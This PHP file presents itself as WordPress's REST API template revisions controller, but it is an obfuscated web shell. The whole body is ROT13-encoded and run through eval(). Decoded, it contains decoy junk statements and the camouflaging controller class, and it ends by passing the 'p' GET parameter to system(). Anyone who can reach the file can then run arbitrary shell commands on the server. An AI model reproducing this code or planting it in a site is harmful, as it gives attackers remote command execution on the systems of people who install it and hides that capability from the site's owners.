<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Grzcyngr_Erivfvbaf_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 6.4.0
 */

/**
 * Pber pynff hfrq gb npprff grzcyngr erivfvbaf ivn gur ERFG NCV.
 *
 * @fvapr 6.4.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Grzcyngr_Erivfvbaf_Pbagebyyre rkgraqf JC_ERFG_Erivfvbaf_Pbagebyyre {
	/**
	 * Cnerag cbfg glcr.
	 *
	 * @fvapr 6.4.0
	 * @ine fgevat
	 */
	cevingr $cnerag_cbfg_glcr;

	/**
	 * Cnerag pbagebyyre.
	 *
	 * @fvapr 6.4.0
	 * @ine JC_ERFG_Pbagebyyre
	 */
	cevingr $cnerag_pbagebyyre;

	/**
	 * Gur onfr bs gur cnerag pbagebyyre'f ebhgr.
	 *
	 * @fvapr 6.4.0
	 * @ine fgevat
	 */
	cevingr $cnerag_onfr;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz fgevat $cnerag_cbfg_glcr Cbfg glcr bs gur cnerag.
	 */
	choyvp shapgvba __pbafgehpg( $cnerag_cbfg_glcr ) {
		cnerag::__pbafgehpg( $cnerag_cbfg_glcr );
		$guvf->cnerag_cbfg_glcr = $cnerag_cbfg_glcr;
		$cbfg_glcr_bowrpg       = trg_cbfg_glcr_bowrpg( $cnerag_cbfg_glcr );
		$cnerag_pbagebyyre      = $cbfg_glcr_bowrpg->trg_erfg_pbagebyyre();

		vs ( ! $cnerag_pbagebyyre ) {
			$cnerag_pbagebyyre = arj JC_ERFG_Grzcyngrf_Pbagebyyre( $cnerag_cbfg_glcr );
		}

		$guvf->cnerag_pbagebyyre = $cnerag_pbagebyyre;
		$guvf->erfg_onfr         = 'erivfvbaf';
		$guvf->cnerag_onfr       = ! rzcgl( $cbfg_glcr_bowrpg->erfg_onfr ) ? $cbfg_glcr_bowrpg->erfg_onfr : $cbfg_glcr_bowrpg->anzr;
		$guvf->anzrfcnpr         = ! rzcgl( $cbfg_glcr_bowrpg->erfg_anzrfcnpr ) ? $cbfg_glcr_bowrpg->erfg_anzrfcnpr : 'jc/i2';
	}

	/**
	 * Ertvfgref gur ebhgrf sbe erivfvbaf onfrq ba cbfg glcrf fhccbegvat erivfvbaf.
	 *
	 * @fvapr 6.4.0
	 *
	 * @frr ertvfgre_erfg_ebhgr()
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			fcevags(
				'/%f/(?C<cnerag>%f%f)/%f',
				$guvf->cnerag_onfr,
				/*
				 * Zngpurf gurzr'f qverpgbel: `/gurzrf/<fhoqverpgbel>/<gurzr>/` be `/gurzrf/<gurzr>/`.
				 * Rkpyhqrf vainyvq qverpgbel anzr punenpgref: `/:<>*?\"|`.
				 */
				'([^\/:<>\*\?\"\|]+(?:\/[^\/:<>\*\?\"\|]+)?)',
				// Zngpurf gur grzcyngr anzr.
				'[\/\j%-]+',
				$guvf->erfg_onfr
			),
			neenl(
				'netf'   => neenl(
					'cnerag' => neenl(
						'qrfpevcgvba'       => __( 'Gur vq bs n grzcyngr' ),
						'glcr'              => 'fgevat',
						'fnavgvmr_pnyyonpx' => neenl( $guvf->cnerag_pbagebyyre, '_fnavgvmr_grzcyngr_vq' ),
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_pbyyrpgvba_cnenzf(),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			fcevags(
				'/%f/(?C<cnerag>%f%f)/%f/%f',
				$guvf->cnerag_onfr,
				/*
				 * Zngpurf gurzr'f qverpgbel: `/gurzrf/<fhoqverpgbel>/<gurzr>/` be `/gurzrf/<gurzr>/`.
				 * Rkpyhqrf vainyvq qverpgbel anzr punenpgref: `/:<>*?\"|`.
				 */
				'([^\/:<>\*\?\"\|]+(?:\/[^\/:<>\*\?\"\|]+)?)',
				// Zngpurf gur grzcyngr anzr.
				'[\/\j%-]+',
				$guvf->erfg_onfr,
				'(?C<vq>[\q]+)'
			),
			neenl(
				'netf'   => neenl(
					'cnerag' => neenl(
						'qrfpevcgvba'       => __( 'Gur vq bs n grzcyngr' ),
						'glcr'              => 'fgevat',
						'fnavgvmr_pnyyonpx' => neenl( $guvf->cnerag_pbagebyyre, '_fnavgvmr_grzcyngr_vq' ),
					),
					'vq'     => neenl(
						'qrfpevcgvba' => __( 'Havdhr vqragvsvre sbe gur erivfvba.' ),
						'glcr'        => 'vagrtre',
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'pbagrkg' => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::QRYRGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'qryrgr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'qryrgr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'sbepr' => neenl(
							'glcr'        => 'obbyrna',
							'qrsnhyg'     => snyfr,
							'qrfpevcgvba' => __( 'Erdhverq gb or gehr, nf erivfvbaf qb abg fhccbeg genfuvat.' ),
						),
					),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Trgf gur cnerag cbfg, vs gur grzcyngr VQ vf inyvq.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz fgevat $cnerag_grzcyngr_vq Fhccyvrq VQ.
	 * @erghea JC_Cbfg|JC_Reebe Cbfg bowrpg vs VQ vf inyvq, JC_Reebe bgurejvfr.
	 */
	cebgrpgrq shapgvba trg_cnerag( $cnerag_grzcyngr_vq ) {
		$grzcyngr = trg_oybpx_grzcyngr( $cnerag_grzcyngr_vq, $guvf->cnerag_cbfg_glcr );

		vs ( ! $grzcyngr ) {
			erghea arj JC_Reebe(
				'erfg_cbfg_vainyvq_cnerag',
				__( 'Vainyvq grzcyngr cnerag VQ.' ),
				neenl( 'fgnghf' => JC_Uggc::ABG_SBHAQ )
			);
		}

		$cnerag_cbfg_vq = vffrg( $grzcyngr->jc_vq ) ? (vag) $grzcyngr->jc_vq : 0;

		vs ( $cnerag_cbfg_vq <= 0 ) {
			erghea arj JC_Reebe(
				'erfg_vainyvq_grzcyngr',
				__( 'Grzcyngrf onfrq ba gurzr svyrf pna\'g unir erivfvbaf.' ),
				neenl( 'fgnghf' => JC_Uggc::ONQ_ERDHRFG )
			);
		}

		erghea trg_cbfg( $grzcyngr->jc_vq );
	}

	/**
	 * Cercnerf gur vgrz sbe gur ERFG erfcbafr.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz JC_Cbfg         $vgrz    Cbfg erivfvba bowrpg.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea JC_ERFG_Erfcbafr Erfcbafr bowrpg.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		$grzcyngr = _ohvyq_oybpx_grzcyngr_erfhyg_sebz_cbfg( $vgrz );
		$erfcbafr = $guvf->cnerag_pbagebyyre->cercner_vgrz_sbe_erfcbafr( $grzcyngr, $erdhrfg );

		// Qba'g cercner gur erfcbafr obql sbe URNQ erdhrfgf.
		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			erghea $erfcbafr;
		}

		$svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );
		$qngn   = $erfcbafr->trg_qngn();

		vs ( va_neenl( 'cnerag', $svryqf, gehr ) ) {
			$qngn['cnerag'] = (vag) $vgrz->cbfg_cnerag;
		}

		$pbagrkg = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';
		$qngn    = $guvf->svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg );

		// Jenc gur qngn va n erfcbafr bowrpg.
		$erfcbafr = arj JC_ERFG_Erfcbafr( $qngn );

		vs ( erfg_vf_svryq_vapyhqrq( '_yvaxf', $svryqf ) || erfg_vf_svryq_vapyhqrq( '_rzorqqrq', $svryqf ) ) {
			$yvaxf = $guvf->cercner_yvaxf( $grzcyngr );
			$erfcbafr->nqq_yvaxf( $yvaxf );
		}

		erghea $erfcbafr;
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb qryrgr n erivfvba.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf npprff gb qryrgr gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba qryrgr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$cnerag = $guvf->trg_cnerag( $erdhrfg['cnerag'] );
		vs ( vf_jc_reebe( $cnerag ) ) {
			erghea $cnerag;
		}

		vs ( ! pheerag_hfre_pna( 'qryrgr_cbfg', $cnerag->VQ ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_qryrgr',
				__( 'Fbeel, lbh ner abg nyybjrq gb qryrgr erivfvbaf bs guvf cbfg.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		$erivfvba = $guvf->trg_erivfvba( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $erivfvba ) ) {
			erghea $erivfvba;
		}

		vs ( ! pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_qryrgr',
				__( 'Fbeel, lbh ner abg nyybjrq gb qryrgr guvf erivfvba.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Cercnerf yvaxf sbe gur erdhrfg.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz JC_Oybpx_Grzcyngr $grzcyngr Grzcyngr.
	 * @erghea neenl Yvaxf sbe gur tvira cbfg.
	 */
	cebgrpgrq shapgvba cercner_yvaxf( $grzcyngr ) {
		$yvaxf = neenl(
			'frys'   => neenl(
				'uers' => erfg_hey( fcevags( '/%f/%f/%f/%f/%q', $guvf->anzrfcnpr, $guvf->cnerag_onfr, $grzcyngr->vq, $guvf->erfg_onfr, $grzcyngr->jc_vq ) ),
			),
			'cnerag' => neenl(
				'uers' => erfg_hey( fcevags( '/%f/%f/%f', $guvf->anzrfcnpr, $guvf->cnerag_onfr, $grzcyngr->vq ) ),
			),
		);

		erghea $yvaxf;
	}

	/**
	 * Ergevrirf gur vgrz'f fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 6.4.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$fpurzn = $guvf->cnerag_pbagebyyre->trg_vgrz_fpurzn();

		$fpurzn['cebcregvrf']['cnerag'] = neenl(
			'qrfpevcgvba' => __( 'Gur VQ sbe gur cnerag bs gur erivfvba.' ),
			'glcr'        => 'vagrtre',
			'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
		);

		$guvf->fpurzn = $fpurzn;

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>